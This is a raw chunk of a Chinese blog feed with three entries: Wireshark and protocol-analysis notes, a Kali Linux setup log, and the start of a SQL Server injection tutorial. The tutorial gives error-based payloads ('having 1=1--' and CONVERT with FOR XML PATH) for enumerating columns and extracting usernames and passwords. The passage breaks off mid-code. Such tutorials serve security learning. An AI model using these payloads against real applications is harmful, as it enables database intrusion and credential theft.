互联网协议IPv4</span><span class="hljs-attr">Header Length:</span> <span class="hljs-number">20</span> <span class="hljs-string">bytes</span><span class="hljs-comment"># IP包头部的长度</span><span class="hljs-attr">Differentiated Services Field:</span> <span class="hljs-number">0x00</span> <span class="hljs-string">(DSCP</span> <span class="hljs-attr">0x00:</span> <span class="hljs-string">Default;</span> <span class="hljs-attr">ECN: 0x00:</span> <span class="hljs-string">Not-ECT</span> <span class="hljs-string">(Not</span> <span class="hljs-string">ECN-Capable</span> <span class="hljs-string">Transport))</span><span class="hljs-comment"># 差分服务字段</span><span class="hljs-attr">Total Length:</span> <span class="hljs-number">296</span><span class="hljs-comment"># IP包的总长度</span><span class="hljs-attr">Identification:</span> <span class="hljs-number">0x2863</span> <span class="hljs-string">(10339)</span><span class="hljs-comment"># 标志字段</span><span class="hljs-attr">Flags:</span> <span class="hljs-number">0x02</span> <span class="hljs-string">(Don't</span> <span class="hljs-string">Fragment)</span><span class="hljs-comment"># 标记字段</span><span class="hljs-attr">Fragment offset:</span> <span class="hljs-number">0</span><span class="hljs-comment"># 分片偏移</span><span class="hljs-attr">Time to live:</span> <span class="hljs-number">49</span><span class="hljs-comment"># 生存期</span><span class="hljs-attr">Protocol:</span> <span class="hljs-string">TCP</span> <span class="hljs-string">(6)</span><span class="hljs-comment"># 当前数据包所封装的上层协议为TCP协议</span><span class="hljs-attr">Header checksum:</span> <span class="hljs-number">0x7b43</span> <span class="hljs-string">[validation</span> <span class="hljs-string">disabled]</span><span class="hljs-comment"># 头部数据的校验和</span><span class="hljs-attr">Source:</span> <span class="hljs-number">220.181</span><span class="hljs-number">.7</span><span class="hljs-number">.190</span> <span class="hljs-string">(220.181.7.190)</span><span class="hljs-comment"># 源IP地址</span><span class="hljs-attr">Destination:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.14</span> <span class="hljs-string">(192.168.0.14)</span><span class="hljs-comment"># 目标IP地址</span></code></pre><ul><li>传输层TCP数据段的头部信息</li></ul><pre><code class="hljs yaml"><span class="hljs-string">Transmission</span> <span class="hljs-string">Control</span> <span class="hljs-string">Protocol,</span> <span class="hljs-attr">Src Port:</span> <span class="hljs-number">80</span> <span class="hljs-string">(80),</span> <span class="hljs-attr">Dst Port:</span> <span class="hljs-number">2488</span> <span class="hljs-string">(2488),</span> <span class="hljs-attr">Seq:</span> <span class="hljs-number">422</span><span class="hljs-string">,</span> <span class="hljs-attr">Ack:</span> <span class="hljs-number">3024</span><span class="hljs-string">,</span> <span class="hljs-attr">Len:</span> <span class="hljs-number">256</span><span class="hljs-attr">Source Port:</span> <span class="hljs-number">80</span> <span class="hljs-string">(80)</span><span class="hljs-comment"># 源端口号</span><span class="hljs-attr">Destination Port:</span> <span class="hljs-number">2488</span> <span class="hljs-string">(2488)</span><span class="hljs-comment"># 目标端口号</span><span class="hljs-string">[Stream</span> <span class="hljs-attr">index:</span> <span class="hljs-number">16</span><span class="hljs-string">]</span><span class="hljs-string">[TCP</span> <span class="hljs-attr">Segment Len:</span> <span class="hljs-number">256</span><span class="hljs-string">]</span><span class="hljs-attr">Sequence number:</span> <span class="hljs-number">422</span>    <span class="hljs-string">(relative</span> <span class="hljs-string">sequence</span> <span class="hljs-string">number)</span><span class="hljs-comment"># 序列号（相对序列号）</span><span class="hljs-string">[Next</span> <span class="hljs-attr">sequence number:</span> <span class="hljs-number">678</span>    <span class="hljs-string">(relative</span> <span class="hljs-string">sequence</span> <span class="hljs-string">number)]</span><span class="hljs-comment"># 下一个序列号（相对序列号）</span><span class="hljs-attr">Acknowledgment number:</span> <span class="hljs-number">3024</span>    <span class="hljs-string">(relative</span> <span class="hljs-string">ack</span> <span class="hljs-string">number)</span><span class="hljs-comment"># 确认序列号</span><span class="hljs-attr">Header Length:</span> <span class="hljs-number">20</span> <span class="hljs-string">bytes</span><span class="hljs-comment"># 头部长度</span><span class="hljs-string">....</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-number">1000</span> <span class="hljs-string">=</span> <span class="hljs-attr">Flags:</span> <span class="hljs-number">0x018</span> <span class="hljs-string">(PSH,</span> <span class="hljs-string">ACK)</span><span class="hljs-comment"># TCP标记字段</span><span class="hljs-attr">Window size value:</span> <span class="hljs-number">162</span><span class="hljs-comment"># 流量控制的窗口大小</span><span class="hljs-attr">Checksum:</span> <span class="hljs-number">0x6fc4</span> <span class="hljs-string">[validation</span> <span class="hljs-string">disabled]</span><span class="hljs-comment"># TCP数据段的校验和</span></code></pre><h4 id="2-Wireshark的实用表格"><a href="#2-Wireshark的实用表格" class="headerlink" title="2.Wireshark的实用表格"></a>2.Wireshark的实用表格</h4><ul><li>常用统计功能<ul><li>各层通信均需要相应的端点，从statistics菜单——&gt;endpoints中可以查看各层的端点。</li><li>statistics——&gt;conversion可以查看数据包中的会话信息。</li><li>statistics ——&gt;Protocol Hierarchy可以查看协议的分层统计信息。从协议种类及占比中可以分析用户特征。</li></ul></li><li>GeoLiteCity插件可以在endpoint 中解析出IP地址的地理位置，并可以绘制地点图。</li><li>最活跃的通信端点不一定包含了流量最大的会话。</li></ul><h4 id="3-Wireshark的图形显示"><a href="#3-Wireshark的图形显示" class="headerlink" title="3.Wireshark的图形显示"></a>3.Wireshark的图形显示</h4><p>​    图形能够直观地显示数据通信特征，和表格共同使用，有效辅助分析，以下功能在statistics菜单中。</p><ul><li>IO Graphs：分析网络吞吐量，可以利用filter来获取不同特征的吞吐量信息。<ul><li>巧妙选择filter可以分析网络中的很多问题。例如：<ul><li>tcp.analysis.duplicate_ack：tcp重发确认包</li><li>tcp.analysis.lost_segment：tcp丢失的包</li><li>tcp.analysis.retransmission：tcp重发包</li></ul></li></ul></li><li>Round Trip Time Graph：分析数据包的往返时间，可用于分析网络中延迟等问题。</li><li>Flow Graph：数据流图，将连接可视化，并且将一段时间中的数据流显示出来。数据流图一般以列的方式将主机之间的连接显示出来，并将数据组织到一起——如直观分析三次握手。</li></ul><h4 id="4-Wireshark的高级特性"><a href="#4-Wireshark的高级特性" class="headerlink" title="4.Wireshark的高级特性"></a>4.Wireshark的高级特性</h4><h5 id="协议解析与重新解码"><a href="#协议解析与重新解码" class="headerlink" title="协议解析与重新解码"></a>协议解析与重新解码</h5><p>​    Wireshark会根据数据包特征自动选择协议解析器，但当数据包采用了与标准不同的协议格式时，可能会导致解析错误。例如：若某ftp数据包使用了HTTPS常用的443端口，则易被误解析为SSL协议。</p><p>​    此时需要右击数据包，设置decode as为合适解析器，从而重新解码分析。</p><p>​    Decode as——&gt;Show current 可以显示最近的解析记录。</p><h5 id="TCP流的跟踪"><a href="#TCP流的跟踪" class="headerlink" title="TCP流的跟踪"></a>TCP流的跟踪</h5><p>​    右键——&gt;跟踪TCP流，可以看到tcp连接两端的通信详情。</p><h5 id="分析数据包长度"><a href="#分析数据包长度" class="headerlink" title="分析数据包长度"></a>分析数据包长度</h5><p>​    统计——&gt;数据包长度——&gt;create state可以查看数据包长度分布。</p><p>​    可通过分析数据包长度分布判断网络中的行为（如数据传输）</p><ul><li>常见数据包长度范围及其特征：<ul><li>1280-2559：包含应用层数据传输等。</li><li>40-79：TCP控制数据包。</li></ul></li></ul><h5 id="专家分析"><a href="#专家分析" class="headerlink" title="专家分析"></a>专家分析</h5><p>​    Analyze——&gt;Expert Infos 专家信息，可以直观地看到数据通信中的错误特征等。</p><ul><li><p>包含Error、Warning、Notes、Chats、Details等等分类：</p><ul><li><strong>Error：</strong>数据包里面或者解析器解析时出现的错误。 </li><li><strong>Warnings：</strong>不正常通信中的异常数据包。</li><li><strong>Notes：</strong>正常通信中的异常数据包。 </li><li><strong>Chats：</strong>网络通信的基本信息。 </li><li><strong>Details：</strong>显示数据包的详细信息。</li><li><strong>Packet Comments：</strong>数据包的描述信息。</li></ul><p>​</p></li></ul><h4 id="5-Wireshark的命令行模式"><a href="#5-Wireshark的命令行模式" class="headerlink" title="5.Wireshark的命令行模式"></a>5.Wireshark的命令行模式</h4><h5 id="命令行模式优势"><a href="#命令行模式优势" class="headerlink" title="命令行模式优势"></a>命令行模式优势</h5><ul><li>可以使用辅助工具（awk，grep等）</li><li>常用工具：tshark、capinfos</li></ul><h5 id="利用命令行模式进行调优分析"><a href="#利用命令行模式进行调优分析" class="headerlink" title="利用命令行模式进行调优分析"></a>利用命令行模式进行调优分析</h5><p>​    进行性能调优主要是对Summary（概述信息）、Service Response Time（服务响应时间）以及Expert Info Composite（专家信息整合）的内容进行分析。</p><h5 id="命令行工具的常用命令"><a href="#命令行工具的常用命令" class="headerlink" title="命令行工具的常用命令"></a>命令行工具的常用命令</h5><h5 id="命令行工具与第三方辅助工具的使用方法"><a href="#命令行工具与第三方辅助工具的使用方法" class="headerlink" title="命令行工具与第三方辅助工具的使用方法"></a>命令行工具与第三方辅助工具的使用方法</h5><h3 id="第二章-协议篇"><a href="#第二章-协议篇" class="headerlink" title="第二章 协议篇"></a>第二章 协议篇</h3><h4 id="6-ARP协议的数据包分析"><a href="#6-ARP协议的数据包分析" class="headerlink" title="6.ARP协议的数据包分析"></a>6.ARP协议的数据包分析</h4><h5 id="ARP基本概念"><a href="#ARP基本概念" class="headerlink" title="ARP基本概念"></a>ARP基本概念</h5><ul><li>RFC-826文档记录了ARP协议的标准。</li><li>ARP数据包分为请求（Request，广播）和响应（Reply，单播）两种。</li><li>每一个主机都有一个ARP缓存表，在接收到请求和响应包时更新。</li></ul><h5 id="ARP数据包分析"><a href="#ARP数据包分析" class="headerlink" title="ARP数据包分析"></a>ARP数据包分析</h5><ul><li>需注意的字段：<ul><li>Opcode：操作码，1-请求；2-响应</li><li>Target MAC address：请求中为全0（未知），响应中为响应主机的MAC地址。</li></ul></li><li>免费ARP（？是<strong>Gratuitous ARP</strong>的翻译,私以为应翻译为<strong>无由（不经请求的）ARP</strong>？） <ul><li>当某主机的IP地址发生变化，则会主动（不经过请求）向网络中广播（链路层Dst：ff:ff:ff:ff:ff:ff）新的地址映射以便其他主机更新缓存表。</li><li>数据包特征：<ul><li>Sender MAC address：本机MAC地址</li><li>Sender IP address 和Target IP address：相同，均为本机目前的IP地址</li><li>Target MAC address：为全0</li></ul></li></ul></li></ul><h4 id="7-Wireshark眼中的IP协议"><a href="#7-Wireshark眼中的IP协议" class="headerlink" title="7.Wireshark眼中的IP协议"></a>7.Wireshark眼中的IP协议</h4><h5 id="TTL与IP分片概念及其分析"><a href="#TTL与IP分片概念及其分析" class="headerlink" title="TTL与IP分片概念及其分析"></a>TTL与IP分片概念及其分析</h5><ul><li>TTL：数据包被丢弃前能经过的最大路由数目。在数据包创建时确定，一般每经过一个路由-1，为0时丢弃数据包。</li><li>IP数据包分片：将数据流分为更小片段，使其可以在跨越不同类型的网络时可靠传输。由第二层使用的网络类型的MTU决定。<ul><li>Flag字段为1（more fragments）时为首个或中间的分片。</li><li>fragment offset为分片偏移字段。</li><li>Flag为0时表示不分片或是最后一个分片。</li><li>同一个数据流的几个分片，其Identification字段相同。</li></ul></li></ul><h5 id="捕获IP数据包"><a href="#捕获IP数据包" class="headerlink" title="捕获IP数据包"></a>捕获IP数据包</h5><ul><li>在Capture菜单——&gt;options中可以设置Capture Filter来为捕获数据包添加过滤器。</li></ul><h4 id="8-TCP与UDP协议详解"><a href="#8-TCP与UDP协议详解" class="headerlink" title="8.TCP与UDP协议详解"></a>8.TCP与UDP协议详解</h4><h5 id="TCP、UDP基本概念"><a href="#TCP、UDP基本概念" class="headerlink" title="TCP、UDP基本概念"></a>TCP、UDP基本概念</h5><ul><li>TCP——Transmission Control Protocol</li></ul><h5 id="TCP三次握手、断开及重置"><a href="#TCP三次握手、断开及重置" class="headerlink" title="TCP三次握手、断开及重置"></a>TCP三次握手、断开及重置</h5><ul><li>三次握手：略</li><li>断开：略</li><li>重置：正常情况下连接会正常断开，但由于某些原因出现连接意外中断或连接被拒绝时，发送RST标志位为1的数据包可以表示连接终止</li></ul><h5 id="TCP与UDP数据包分析"><a href="#TCP与UDP数据包分析" class="headerlink" title="TCP与UDP数据包分析"></a>TCP与UDP数据包分析</h5><ul><li>Edit——&gt;Preferences——&gt;User Interface——&gt;Name Resolution，启用Resolve transport names项，可以解析常用端口及相应服务。</li><li>Edit——&gt;Preferences——&gt;Protocols——&gt;TCP， 启用Analyze TCP sequence numbers项，可以将TCP的数据包的seq值解析为从0开始的相对值；关闭则为绝对值。</li><li>Edit——&gt;Find Packet可以对特定数据包进行搜索和过滤。</li><li>右击数据包——&gt;Colorize Conversation,可以对相关联（如同一TCP连接）的数据包进行着色。</li></ul><h4 id="9-TCP中也有一个窗口"><a href="#9-TCP中也有一个窗口" class="headerlink" title="9.TCP中也有一个窗口"></a>9.TCP中也有一个窗口</h4><h5 id="Ack、Seq、Len的概念及关系"><a href="#Ack、Seq、Len的概念及关系" class="headerlink" title="Ack、Seq、Len的概念及关系"></a>Ack、Seq、Len的概念及关系</h5><ul><li>两端发送数据包的Seq值分别计算，下一个包的Seq = 上一个包Seq+上一个包Len</li><li>接收方回复的Ack值 = 其接收到的上一个包的Seq+其接收到的上一个包的Len = 发送方的下一个Seq值</li></ul><h5 id="TCP滑动窗口"><a href="#TCP滑动窗口" class="headerlink" title="TCP滑动窗口"></a>TCP滑动窗口</h5><h5 id="TCP零窗口的概念及用途"><a href="#TCP零窗口的概念及用途" class="headerlink" title="TCP零窗口的概念及用途"></a>TCP零窗口的概念及用途</h5><ul><li>当服务器因为某些原因不能接收数据时，会在ack包中更新窗口大小为0，客户端收到后会停止传输数据，只定期发送保活的数据包，等待服务器再次更新窗口大小。</li></ul><h5 id="TCP滑动窗口数据包分析"><a href="#TCP滑动窗口数据包分析" class="headerlink" title="TCP滑动窗口数据包分析"></a>TCP滑动窗口数据包分析</h5><ul><li>TCP数据包中window size value(win)字段为窗口大小。</li><li>窗口不断减小表示延迟不断增加。</li><li>启用Analyze TCP sequence numbers项，可以解析出并标明zero window和keep-alive数据包。</li></ul><h4 id="10-TCP重传技术的研究"><a href="#10-TCP重传技术的研究" class="headerlink" title="10.TCP重传技术的研究"></a>10.TCP重传技术的研究</h4><h5 id="TCP重传原理"><a href="#TCP重传原理" class="headerlink" title="TCP重传原理"></a>TCP重传原理</h5><ul><li>Retransmission Time Out（RTO）重传超时。</li><li>重传极限次数：Windows——5次，Linux——15次。</li></ul><h5 id="快速重传（Fast-Retransmission）流程"><a href="#快速重传（Fast-Retransmission）流程" class="headerlink" title="快速重传（Fast Retransmission）流程"></a>快速重传（Fast Retransmission）流程</h5><ul><li>当发送方累计收到3个相同seq的ack数据包时，触发快速重传机制，重新发送该seq号对应的数据包。</li></ul><h5 id="重传机制的分析"><a href="#重传机制的分析" class="headerlink" title="重传机制的分析"></a>重传机制的分析</h5><ul><li><p><strong>当多个数据包丢失时如何重传？</strong> </p><ul><li>情景：1~8共8个包，其中2、5丢失，其余正常。</li><li>方案：</li></ul><ol><li>收到三个ack2后，重传2及以后的所有数据包。简单但效率低。</li><li>（NewReno——rfc2582、3782）数据包2被重传后，接收方再发送一个ack5，待5重传成功后，接收方发送ack9（即下一个要接收的数据包）。在丢包量大的时候会占用多个往返时间。</li><li>（ *<em>SACK *</em>——rfc2018）接收方在请求重传2号包时，附带已接收的所有包的序号。</li></ol></li></ul><h4 id="11-用途广泛的ICMP协议"><a href="#11-用途广泛的ICMP协议" class="headerlink" title="11.用途广泛的ICMP协议"></a>11.用途广泛的ICMP协议</h4><h5 id="ICMP基本概念"><a href="#ICMP基本概念" class="headerlink" title="ICMP基本概念"></a>ICMP基本概念</h5><ul><li>Internet Control Message Protocol，因特网控制报文协议</li><li>利用IP协议进行传输</li><li>用于对网络的检测和诊断，亦可用于对网络的攻击（ICMP dos等）</li></ul><h5 id="ping及tracert数据包异同"><a href="#ping及tracert数据包异同" class="headerlink" title="ping及tracert数据包异同"></a>ping及tracert数据包异同</h5><ul><li>ping<ul><li>分Echo request（Type=8，code=0） 和Echo reply（Type=0， code=0）</li><li>Identifier字段用于匹配对应的request和reply</li><li>Data数据域内为随机字符串，对应的一对request和reply，其data中内容相同。</li><li>对于攻击者，Data内容可用于推断目标主机操作系统，亦可在此处放置用于反向连接的数据位。</li></ul></li><li>tracert<ul><li>起始同样发送Echo request 数据包，但其TTL=1。</li><li>上述数据包到达的第一个设备会返回TTL exceed响应（Type=11，code=0），且该响应数据包中还会包含上述请求包的ICMP头部信息，故称为ICMP双头包，在网络故障检修中很有用。</li><li>将上述两过程重复数次后，发送方发送TTL+1的request数据包并获得响应。</li><li>重复以上过程并递增TTL，直至数据包可以正常到达目的地。</li></ul></li></ul><p><strong>（未完待续……）</strong></p>]]></content>
    
    
    <categories>
      
      <category>网络协议</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据包分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali Linux 2017 安装配置</title>
    <link href="/2017/11/29/Kali-Linux-2017-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"/>
    <url>/2017/11/29/Kali-Linux-2017-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>下定决心好好学web，然后发现大一安装的Kali2.0因为年少无知乱配置搞得一团糟，想想干脆重新装一个，顺便把配置过程记录一下。</p><p>本文长期更新，遇到的各种坑都会记一下。</p><a id="more"></a><h4 id="0x01-下载与安装"><a href="#0x01-下载与安装" class="headerlink" title="0x01 下载与安装"></a>0x01 下载与安装</h4><p>下载没什么好说的，直接上官网<a href="http://www.kali.org/downloads/按步骤下载。" target="_blank" rel="noopener">www.kali.org/downloads/按步骤下载。</a></p><p>可以直接下载ISO镜像然后往虚拟机里安装，也可以直接下载安装好的虚拟机文件导入VMware。</p><h4 id="0x02-账户与网络设置"><a href="#0x02-账户与网络设置" class="headerlink" title="0x02 账户与网络设置"></a>0x02 账户与网络设置</h4><h5 id="给root用户设置密码"><a href="#给root用户设置密码" class="headerlink" title="给root用户设置密码"></a>给root用户设置密码</h5><p>su:鉴定故障</p><p>终端窗口运行 su 输入密码，提示鉴定失败。</p><p>原因：</p><p>安装linux时，未输入ROOT密码；或新建用户，勾选“设为管理员”，仅为新用户设置密码。</p><p>未设置ROOT密码，系统检测失败。</p><p>在终端中输入如下命令设置密码：</p><pre><code class="hljs bash">sudo passwd root</code></pre><h5 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h5><p>虚拟机使用NAT模式则kali设置DHCP即可；若使用桥接模式，可以设置成静态IP。</p><p>若网络突然坏掉，右上角网络图标消失，输入命令:</p><pre><code class="hljs bash"><span class="hljs-comment">#重启网络管理服务</span>/etc/init.d/network-manager restart<span class="hljs-comment">#重启网卡</span>/etc/init.d/networking restart</code></pre><h4 id="0x03-更新源配置"><a href="#0x03-更新源配置" class="headerlink" title="0x03 更新源配置"></a>0x03 更新源配置</h4><p>以su权限打开/etc/apt/sources.list，添加源即可。</p><pre><code class="hljs bash">/打开存储更新源的文件sudo leafpad /etc/apt/sources.list<span class="hljs-comment">#auto</span>deb http://http.kali.org/kali kali-rolling main non-free contrib<span class="hljs-comment">#中科大</span>deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib<span class="hljs-comment">#浙大</span>deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freedeb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free<span class="hljs-comment">#东软大学</span>deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contribdeb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib<span class="hljs-comment">#重庆大学</span>deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib<span class="hljs-comment">#阿里源</span>deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib<span class="hljs-comment">#官方源</span><span class="hljs-comment">#deb http://http.kali.org/kali kali-rolling main non-free contrib</span><span class="hljs-comment">#deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span></code></pre><p>更新软件包</p><pre><code class="hljs processing">apt-<span class="hljs-built_in">get</span> clean    <span class="hljs-comment">//清除缓存索引</span>apt-<span class="hljs-built_in">get</span> update    <span class="hljs-comment">//更新索引文件</span>apt-<span class="hljs-built_in">get</span> upgrade    <span class="hljs-comment">//更新实际的软件包文件</span>apt-<span class="hljs-built_in">get</span> <span class="hljs-built_in">dist</span>-upgrade    <span class="hljs-comment">//根据依赖关系更新</span><span class="hljs-comment">//可以加 -y 参数，默认更新过程中所有选择全为 yes</span></code></pre><h4 id="0x03-个性配置及软件安装"><a href="#0x03-个性配置及软件安装" class="headerlink" title="0x03 个性配置及软件安装"></a>0x03 个性配置及软件安装</h4><h5 id="设置开启终端快捷键"><a href="#设置开启终端快捷键" class="headerlink" title="设置开启终端快捷键"></a>设置开启终端快捷键</h5><p>名称：开启终端<br>命令：gnome-terminal<br>快捷键：（这个自己按就好）</p><h5 id="中文输入法安装"><a href="#中文输入法安装" class="headerlink" title="中文输入法安装"></a>中文输入法安装</h5><pre><code class="hljs bash">//Google拼音sudo apt-get install fcitx fcitx-googlepinyin//云词组sudo apt-get install fcitx-module-cloudpinyin//配置工具im-configfcitx-configtool</code></pre><h5 id="Firefox-ESR浏览器汉化"><a href="#Firefox-ESR浏览器汉化" class="headerlink" title="Firefox ESR浏览器汉化"></a>Firefox ESR浏览器汉化</h5><pre><code class="hljs bash">apt-get install iceweasel-l10n-zh-cn</code></pre><h5 id="软件包安装工具gdebi"><a href="#软件包安装工具gdebi" class="headerlink" title="软件包安装工具gdebi"></a>软件包安装工具gdebi</h5><pre><code class="hljs bash"><span class="hljs-comment">#gdebi安装</span>apt-get install gdebi<span class="hljs-comment">#运行</span>gdebi-gtk</code></pre><h5 id="安装Typora（没安成功）"><a href="#安装Typora（没安成功）" class="headerlink" title="安装Typora（没安成功）"></a>安装Typora（没安成功）</h5><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> optional, but recommended</span>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAE<span class="hljs-meta">#</span><span class="bash"> add Typora<span class="hljs-string">'s repository</span></span>sudo add-apt-repository 'deb http://typora.io linux/'sudo apt-get update<span class="hljs-meta">#</span><span class="bash"> install typora</span>sudo apt-get install typora</code></pre><h5 id="xampp相关"><a href="#xampp相关" class="headerlink" title="xampp相关"></a>xampp相关</h5><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">启动Apache、MySQL、ProFTPd</span>sudo /opt/lampp/lampp start <span class="hljs-meta">#</span><span class="bash">停止xampp</span>sudo /opt/lampp/lampp stop <span class="hljs-meta">#</span><span class="bash">启动xampp UI</span>cd /opt/lamppsudo ./manager-linux.run (or manager-linux-x64.run)</code></pre><h4 id="0x04-各种问题整理"><a href="#0x04-各种问题整理" class="headerlink" title="0x04 各种问题整理"></a>0x04 各种问题整理</h4><h5 id="python2、python3完美共存"><a href="#python2、python3完美共存" class="headerlink" title="python2、python3完美共存"></a>python2、python3完美共存</h5><p>kali 2017中自带Python2.7和python3.5，但是只有python2.7安装了pip，给Python3.5 安装pip的方法如下：</p><ul><li>在pip官网的安装指南页面（<a href="https://pip.pypa.io/en/stable/installing/）下载**get-pip.py" target="_blank" rel="noopener">https://pip.pypa.io/en/stable/installing/）下载**get-pip.py</a>** ；</li><li>sudo python3 get-pip.py</li><li>安装成功后查看pip -V，pip2 -V，pip3 -V版本：<ul><li>pip、pip3命令对应Python3</li><li>pip2命令对应Python2</li></ul></li></ul><h5 id="共享文件夹配置"><a href="#共享文件夹配置" class="headerlink" title="共享文件夹配置"></a>共享文件夹配置</h5><p>挂载命令<code>sudo vmhgfs-fuse .host:/ /mnt/hgfs</code></p><h5 id="run文件的执行（修改文件权限）"><a href="#run文件的执行（修改文件权限）" class="headerlink" title=".run文件的执行（修改文件权限）"></a>.run文件的执行（修改文件权限）</h5><ul><li>.run 文件的执行</li></ul><pre><code class="hljs dockerfile">chmod +x  *.<span class="hljs-keyword">run</span><span class="bash"> </span>./*.<span class="hljs-keyword">run</span></code></pre><h4 id="0x05-相关资料收集"><a href="#0x05-相关资料收集" class="headerlink" title="0x05 相关资料收集"></a>0x05 相关资料收集</h4><h5 id="kali配置教程"><a href="#kali配置教程" class="headerlink" title="kali配置教程"></a>kali配置教程</h5><p><a href="http://www.cnblogs.com/sqlsec/p/diykali.html" target="_blank" rel="noopener">http://www.cnblogs.com/sqlsec/p/diykali.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见数据库注入技巧——SQL Server</title>
    <link href="/2017/11/19/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94SQL%20Server/"/>
    <url>/2017/11/19/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94SQL%20Server/</url>
    
    <content type="html"><![CDATA[<p>针对 SQL Server 2008、MySQL5.1 和 Oracle 11g 三种数据库，简单归纳注入技巧。本篇为第一部分——SQL Server。</p><a id="more"></a><h3 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h3><h4 id="通过报错提取信息"><a href="#通过报错提取信息" class="headerlink" title="通过报错提取信息"></a>通过报错提取信息</h4><p>SQL Server 的错误提示十分详细，可以通过引发报错提取需要的信息。</p><h5 id="通过-having-子句枚举表和列"><a href="#通过-having-子句枚举表和列" class="headerlink" title="通过 having 子句枚举表和列"></a>通过 having 子句枚举表和列</h5><p>假设数据库结构和查询语句如下：</p><pre><code class="hljs mssql">&#x2F;&#x2F;表结构create table users（id int not null identity(1,1),username varchar(20) not null,password varchar(20) not null,privs int not null,email varchar(50))&#x2F;&#x2F;查询语句select * from users where username&#x3D;&#39;root&#39;</code></pre><p>注入<code>&#39;having 1=1--</code>语句，由于SQL语言中 having 子句用于过滤组，因此会返回类似如下的错误：</p><p><strong>“选择列表中的列“users.id”无效，因为该列未包含在聚合函数或 GROUP BY 子句中。”</strong></p><p>得到表名 users 和其中的列名ID。</p><p>将 user.id 包含在 group by 子句中，即<code>&#39; group by users.id having 1=1--</code>,再次注入，返回报错：</p><p><strong>“选择列表中的列“users.username”无效，因为该列未包含在聚合函数或 GROUP BY 子句中。”</strong></p><p>得到第二个列名。依此类推，即可枚举当前表中所有列名。</p><h5 id="利用数据类型错误提取数据"><a href="#利用数据类型错误提取数据" class="headerlink" title="利用数据类型错误提取数据"></a>利用数据类型错误提取数据</h5><p>最常用的数据类型错误即是数字与字符串的类型错误。在 SQL Server 中，当将字符串与非字符串比较或者试图将字符串转换为不兼容类型时会抛出异常。有趣的是报错中会把涉及的字符串完整地输出。可以用几种方式来实现：</p><ol><li>嵌入子查询</li></ol><pre><code class="hljs mssql">&#x2F;&#x2F;比较数字和字符串select * from users where username&#x3D;&#39;root&#39; and password&#x3D;&#39;root&#39; and 1&gt;(select top 1 username from users)</code></pre><p>错误提示：<strong>在将varchar值‘root’转换成数据类型 int 时失败。</strong></p><p>利用此方法递归查询可得所有username：</p><pre><code class="hljs mssql">select * from users where username&#x3D;&#39;root&#39; and password&#x3D;&#39;root&#39; and1&gt;(select top 1 username from users where username not in(&#39;root&#39;))</code></pre><ol><li>CONVERT( ) 和 CASE( ) 函数（强制类型转换）</li></ol><pre><code class="hljs mssql">select * from users where username&#x3D;&#39;root&#39; and password&#x3D;&#39;root&#39; and1&#x3D;CONVERT(int, (select top 1 users.username from users))</code></pre><p>可以使用 FOR XML PATH 语句将查询的数据生成XML，代替重复递归操作：</p><pre><code class="hljs mssql">select * from users where username&#x3D;&#39;root&#39; and password&#x3D;&#39;root&#39; and1&#x3D;CONVERT(int, (select stuff((select &#39;,&#39;+ users.username,&#39;|&#39; + users.password from users for xml path(&#39;&#39;)),1,1,&#39;&#39;)))</code></pre><p>抛出异常：**”在将 nvarchar 值 ‘root|root,admin|admin,xxser|xxser’ 转换成数据类型 int 时失败。” **</p><h4 id="获取元数据"><a href="#获取元数据" class="headerlink" title="获取元数据"></a>获取元数据</h4><p>SQL Server 中常见的系统数据库视图见下表。</p><table><thead><tr><th align="center">数据库视图</th><th align="center">说 明</th></tr></thead><tbody><tr><td align="center"><strong>sys.databases</strong></td><td align="center">SQL Server 中的所有数据库</td></tr><tr><td align="center"><strong>sys.sql_logins</strong></td><td align="center">SQL Server 中的所有登录名</td></tr><tr><td align="center"><strong>information_schema.tables</strong></td><td align="center">当前用户数据库中的表</td></tr><tr><td align="center"><strong>information_schema.columns</strong></td><td align="center">当前用户数据库中的列</td></tr><tr><td align="center">sys.all_columns</td><td align="center">用户定义对象和系统对象的所有列的联合</td></tr><tr><td align="center">sys.database_principals</td><td align="center">数据库中每个权限或列异常权限</td></tr><tr><td align="center">sys.database_files</td><td align="center">存储在数据库中的数据库文件</td></tr><tr><td align="center">sysobjects</td><td align="center">数据库中创建的每个对象（例如约束、日志、存储过程）</td></tr></tbody></table><p>从这些视图中可以获得有价值的元数据，例如：</p><pre><code class="hljs mssql">&#x2F;&#x2F;获得当前数据库的表名select table_name from information_schema.tables&#x2F;&#x2F;获得当前表的列名select column_name from information_schema.columns where table_name&#x3D;&#39;student&#39;</code></pre><h4 id="Order-by-子句"><a href="#Order-by-子句" class="headerlink" title="Order by 子句"></a>Order by 子句</h4><p>Order by 子句常用于探测表的列数：</p><pre><code class="hljs 